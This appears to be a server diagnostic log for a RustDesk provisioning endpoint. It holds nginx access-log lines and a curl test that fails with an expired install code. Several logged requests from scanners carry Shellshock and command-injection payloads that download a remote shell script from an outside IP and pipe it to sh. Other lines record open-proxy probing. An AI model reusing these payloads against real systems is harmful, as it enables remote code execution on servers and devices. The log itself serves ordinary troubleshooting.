+192.159.99.95 - - [18/Dec/2025:01:52:06 +0000] "GET /cgi-bin/slogin/login.py HTTP/1.1" 301 178 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://41.231.37.153/rondo.ame.sh||busybox wget -qO- http://41.231.37.153/rondo.ame.sh||curl -s http://41.231.37.153/rondo.ame.sh)|sh\x22& # rondo2012@atomicmail.io"
+192.159.99.95 - - [18/Dec/2025:01:52:06 +0000] "GET /cgi-bin/jarrewrite.sh HTTP/1.1" 301 178 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://41.231.37.153/rondo.fve.sh||busybox wget -qO- http://41.231.37.153/rondo.fve.sh||curl -s http://41.231.37.153/rondo.fve.sh)|sh\x22& # rondo2012@atomicmail.io"
+192.159.99.95 - - [18/Dec/2025:01:52:06 +0000] "GET /sys_config_valid.xgi?exeshell=%60wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.enk.sh%7Csh%60 HTTP/1.1" 301 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+192.159.99.95 - admin [18/Dec/2025:01:52:07 +0000] "POST /cgi-bin/httpd.cgi HTTP/1.1" 301 0 "http://46.101.78.179/ping_en.html" "Mozilla/5.0 (rondo2012@atomicmail.io)"
+54.235.238.55 - - [18/Dec/2025:01:52:14 +0000] "GET http://httpbin.org/ip HTTP/1.1" 301 178 "-" "python-requests/2.32.4"
+188.250.60.132 - - [18/Dec/2025:01:52:56 +0000] "GET /agent.ashx HTTP/1.1" 101 374 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:01:53:59 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+95.94.36.90 - - [18/Dec/2025:01:54:30 +0000] "GET /images/images16.png HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0"
+95.94.36.90 - - [18/Dec/2025:01:54:30 +0000] "GET /sounds/chimes.mp3 HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0"
+188.250.60.132 - - [18/Dec/2025:01:56:05 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:01:56:37 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:01:59:14 +0000] "GET /agent.ashx HTTP/1.1" 101 374 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+79.124.40.174 - - [18/Dec/2025:01:59:59 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+79.124.40.174 - - [18/Dec/2025:02:00:00 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 1126 "http://46.101.78.179:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+188.250.60.132 - - [18/Dec/2025:02:00:16 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+142.171.77.234 - - [18/Dec/2025:02:01:49 +0000] "GET http://checkip.amazonaws.com/ HTTP/1.1" 301 178 "-" "-"
+188.250.60.132 - - [18/Dec/2025:02:02:22 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:03:25 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+103.253.27.167 - - [18/Dec/2025:02:03:25 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.161 - - [18/Dec/2025:02:03:25 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.161 - - [18/Dec/2025:02:03:26 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.161 - - [18/Dec/2025:02:03:26 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.167 - - [18/Dec/2025:02:03:26 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.167 - - [18/Dec/2025:02:03:26 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.167 - - [18/Dec/2025:02:03:26 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.161 - - [18/Dec/2025:02:03:27 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.161 - - [18/Dec/2025:02:03:27 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+103.253.27.167 - - [18/Dec/2025:02:03:27 +0000] "CONNECT www.daarelqolam.ac.id:443:443 HTTP/1.1" 400 166 "-" "-"
+167.71.238.34 - - [18/Dec/2025:02:04:49 +0000] "CONNECT jayatrade.com:443:443 HTTP/1.1" 400 166 "-" "-"
+188.250.60.132 - - [18/Dec/2025:02:05:31 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+77.247.108.121 - - [18/Dec/2025:02:05:53 +0000] "GET http://query.cleaning/v4/checker.php HTTP/1.1" 301 178 "-" "curl/7.4"
+188.250.60.132 - - [18/Dec/2025:02:06:34 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET / HTTP/2.0" 200 16512 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /styles/style.css HTTP/2.0" 200 65228 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /styles/custom.css HTTP/2.0" 200 0 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /scripts/u2f-api.js HTTP/2.0" 200 23809 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /scripts/custom.js HTTP/2.0" 200 0 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/push-150.png HTTP/2.0" 200 32517 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /scripts/common-0.0.1.js HTTP/2.0" 200 9908 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/twitter32.png HTTP/2.0" 200 844 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/google32.png HTTP/2.0" 200 741 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/github32.png HTTP/2.0" 200 1148 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/azure32.png HTTP/2.0" 200 302 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/oidc32.png HTTP/2.0" 200 1756 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/jumpcloud32.png HTTP/2.0" 200 956 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/intel32.png HTTP/2.0" 200 1039 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/generic32.png HTTP/2.0" 200 759 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/2fa-key-48.png HTTP/2.0" 200 3110 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/2fa-sms-48.png HTTP/2.0" 200 1692 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/2fa-messaging-48.png HTTP/2.0" 200 3301 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/2fa-mail-48.png HTTP/2.0" 200 1933 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/2fa-push-48.png HTTP/2.0" 200 1804 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /images/login/2fa-duo-48.png HTTP/2.0" 200 1480 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /welcome.png HTTP/2.0" 200 275664 "https://zsangola.bwb.pt/" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /favicon.ico HTTP/2.0" 200 3638 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /manifest.json HTTP/2.0" 200 309 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+195.19.101.204 - - [18/Dec/2025:02:07:21 +0000] "GET /pwalogo.png HTTP/2.0" 200 132816 "-" "Google Chrome 84.0.4147.135 (WebKit 537.36)"
+188.250.60.132 - - [18/Dec/2025:02:08:40 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+146.56.180.42 - - [18/Dec/2025:02:09:01 +0000] "GET http://azenv.net/ HTTP/1.1" 301 178 "-" "Mozilla/5.0"
+146.56.180.42 - - [18/Dec/2025:02:09:02 +0000] "GET http://azenv.net/ HTTP/1.1" 301 178 "-" "Mozilla/5.0"
+146.56.180.42 - - [18/Dec/2025:02:09:02 +0000] "GET http://azenv.net/ HTTP/1.1" 301 178 "-" "Mozilla/5.0"
+146.56.180.42 - - [18/Dec/2025:02:09:03 +0000] "GET http://azenv.net/ HTTP/1.1" 301 178 "-" "Mozilla/5.0"
+146.56.180.42 - - [18/Dec/2025:02:09:03 +0000] "GET http://azenv.net/ HTTP/1.1" 301 178 "-" "Mozilla/5.0"
+146.56.180.42 - - [18/Dec/2025:02:09:04 +0000] "GET http://azenv.net/ HTTP/1.1" 301 178 "-" "Mozilla/5.0"
+188.250.60.132 - - [18/Dec/2025:02:09:13 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:11:50 +0000] "GET /agent.ashx HTTP/1.1" 101 374 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+161.97.101.70 - - [18/Dec/2025:02:12:19 +0000] "CONNECT jayatrade.com:443 HTTP/1.1" 400 166 "-" "-"
+188.250.60.132 - - [18/Dec/2025:02:12:23 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:15:00 +0000] "GET /agent.ashx HTTP/1.1" 101 374 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+31.169.125.236 - - [18/Dec/2025:02:15:02 +0000] "\x04\x01\x00\x19C\xC3\xE4j\x00" 400 166 "-" "-"
+31.169.125.236 - - [18/Dec/2025:02:15:02 +0000] "CONNECT 67.195.228.106:25 HTTP/1.0" 400 166 "-" "-"
+31.169.125.236 - - [18/Dec/2025:02:15:03 +0000] "\x05\x01\x00" 400 166 "-" "-"
+51.89.42.24 - - [18/Dec/2025:02:16:02 +0000] "CONNECT checkip.amazonaws.com:80 HTTP/1.1" 400 166 "-" "-"
+188.250.60.132 - - [18/Dec/2025:02:16:02 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:18:08 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+142.171.77.234 - - [18/Dec/2025:02:18:10 +0000] "GET http://checkip.amazonaws.com/ HTTP/1.1" 301 178 "-" "-"
+188.250.60.132 - - [18/Dec/2025:02:18:44 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+95.94.36.90 - - [18/Dec/2025:02:19:28 +0000] "GET /refresh.ashx HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0"
+213.149.2.33 - - [18/Dec/2025:02:20:12 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+188.250.60.132 - - [18/Dec/2025:02:20:50 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:22:20 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:24:26 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:24:59 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+35.200.246.108 - - [18/Dec/2025:02:27:31 +0000] "POST / HTTP/1.1" 400 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+35.200.246.108 - - [18/Dec/2025:02:27:36 +0000] "POST / HTTP/1.1" 200 74060 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+188.250.60.132 - - [18/Dec/2025:02:27:36 +0000] "GET /agent.ashx HTTP/1.1" 101 374 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+98.97.72.42 - - [18/Dec/2025:02:27:37 +0000] "GET /refresh.ashx HTTP/2.0" 200 2 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+188.250.60.132 - - [18/Dec/2025:02:28:38 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+98.97.72.42 - - [18/Dec/2025:02:29:01 +0000] "GET /refresh.ashx HTTP/2.0" 200 2 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
+108.168.120.166 - - [18/Dec/2025:02:29:24 +0000] "GET http://azenv.net/ HTTP/1.0" 301 178 "https://www.bing.com/search?q=HTTP_HOST" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.\x092.48"
+188.250.60.132 - - [18/Dec/2025:02:30:45 +0000] "GET /agent.ashx HTTP/1.1" 101 355 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+188.250.60.132 - - [18/Dec/2025:02:31:17 +0000] "GET /agent.ashx HTTP/1.1" 101 298 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+193.143.1.78 - - [18/Dec/2025:02:32:11 +0000] "GET / HTTP/1.1" 200 16392 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+193.143.1.78 - - [18/Dec/2025:02:32:40 +0000] "GET / HTTP/1.1" 200 16275 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+188.250.60.132 - - [18/Dec/2025:02:33:55 +0000] "GET /agent.ashx HTTP/1.1" 101 374 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+138.201.207.117 - - [18/Dec/2025:02:33:56 +0000] "CONNECT 138.201.207.117:802 HTTP/1.1" 400 166 "-" "-"
+142.171.77.234 - - [18/Dec/2025:02:34:43 +0000] "GET http://checkip.amazonaws.com/ HTTP/1.1" 301 178 "-" "-"
+188.250.60.132 - - [18/Dec/2025:02:34:56 +0000] "GET /agent.ashx HTTP/1.1" 101 317 "-" "MeshAgent 2025-Mar-6 21:44:07+0000"
+
+Error log path: /var/log/nginx/error.log
+
+Last 50 lines containing '/api/provision/claim' in error.log:
+------------------------------------------------------------
+No matching lines for /api/provision/claim.
+
+Last 200 lines from error.log:
+------------------------------------------------------------
+
+### 5. HTTP test to https://rustdesk.bwb.pt/api/provision/claim
+curl command:
+------------------------------------------------------------
+curl -vk 'https://rustdesk.bwb.pt/api/provision/claim' \
+  -H 'Content-Type: application/json' \
+  -d '{"code":"3126","device_hint":null,"nonce":null}'
+
+curl output (headers + body):
+------------------------------------------------------------
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 46.101.78.179:443...
+* Connected to rustdesk.bwb.pt (46.101.78.179) port 443 (#0)
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* TLSv1.0 (OUT), TLS header, Certificate Status (22):
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [512 bytes data]
+* TLSv1.2 (IN), TLS header, Certificate Status (22):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [122 bytes data]
+* TLSv1.2 (IN), TLS header, Finished (20):
+{ [5 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+{ [19 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+{ [2595 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+{ [264 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+{ [52 bytes data]
+* TLSv1.2 (OUT), TLS header, Finished (20):
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+} [52 bytes data]
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
+* ALPN, server accepted to use h2
+* Server certificate:
+*  subject: CN=rustdesk.bwb.pt
+*  start date: Dec 10 03:16:00 2025 GMT
+*  expire date: Mar 10 03:15:59 2026 GMT
+*  issuer: C=US; O=Let's Encrypt; CN=R12
+*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
+* Using HTTP2, server supports multiplexing
+* Connection state changed (HTTP/2 confirmed)
+* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* Using Stream ID: 1 (easy handle 0x5567be8939f0)
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+> POST /api/provision/claim HTTP/2
+> Host: rustdesk.bwb.pt
+> user-agent: curl/7.81.0
+> accept: */*
+> content-type: application/json
+> content-length: 47
+> 
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+{ [265 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+{ [281 bytes data]
+* old SSL session ID is stale, removing
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* Connection state changed (MAX_CONCURRENT_STREAMS == 128)!
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* We are completely uploaded and fine
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+100    47    0     0  100    47      0     38  0:00:01  0:00:01 --:--:--    38* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+< HTTP/2 400 
+< server: nginx/1.18.0 (Ubuntu)
+< date: Thu, 18 Dec 2025 02:35:07 GMT
+< content-type: application/json
+< vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+< access-control-allow-headers: Content-Type, Authorization
+< access-control-allow-methods: POST, OPTIONS
+< access-control-allow-origin: *
+< 
+{ [61 bytes data]
+100   108    0    61  100    47     40     30  0:00:01  0:00:01 --:--:--    70
+* Connection #0 to host rustdesk.bwb.pt left intact
+{"error":"expired_code","message":"Install code has expired"}
+Detected HTTP status line from curl:
+------------------------------------------------------------
+< HTTP/2 400 
+
+============================================================
+Diagnostic finished.
+Log file generated at:
+  /opt/rustdesk-frontend/logs/diagnostics/provision-claim-20251218-023505.log
+You can now download or inspect this file and share it for analysis.
+============================================================
